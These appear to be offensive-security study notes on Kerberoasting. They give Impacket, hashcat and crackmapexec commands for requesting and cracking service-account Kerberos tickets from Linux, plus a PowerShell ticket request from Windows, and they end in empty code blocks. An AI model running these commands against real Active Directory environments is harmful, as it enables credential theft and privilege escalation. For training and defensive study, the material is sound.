# Kerberoasting - from Linux

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. 
This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. 
## Kerberoasting with GetUserSPNs.py
```bash
# First install Impacket toolkit
sudo python3 -m pip install .
```
## Listing SPN Accounts with GetUserSPNs.py
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username
# we need valid domain credentials and the IP address of a Domain Controller.
``` 
## Requesting all TGS Tickets
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username -request 
``` 
## Requesting a Single TGS ticket
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username -request-user targetUser
``` 
## Saving the TGS Ticket to an Output File
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username -request-user TargetUser -outputfile TargetUser_tgs
``` 
## Cracking the Ticket with Hashcat
```bash
hashcat -m 13100 TargetUser_tgs /usr/share/wordlists/rockyou.txt 
``` 
## Testing Authentication against a Domain Controller
```bash
sudo crackmapexec smb 192.168.0.1 -u TargetUser -p PWDTargetUser
```
____________________________________________________________________________________
# Kerberoasting - from Windows
## Kerberoasting - Semi Manual method
### Enumerating SPNs with setspn.exe
```powershell
setspn.exe -Q */*
```
Targeting a Single User
```powershell
Add-Type -AssemblyName System.IdentityModel
# The Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
# The -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
# System.IdentityModel is a namespace that contains different classes for building security token services
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.mydomain.local:1433"
# We'll then use the New-Object cmdlet to create an instance of a .NET Framework object
# We'll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
```



```powershell

```

```powershell

``` 




















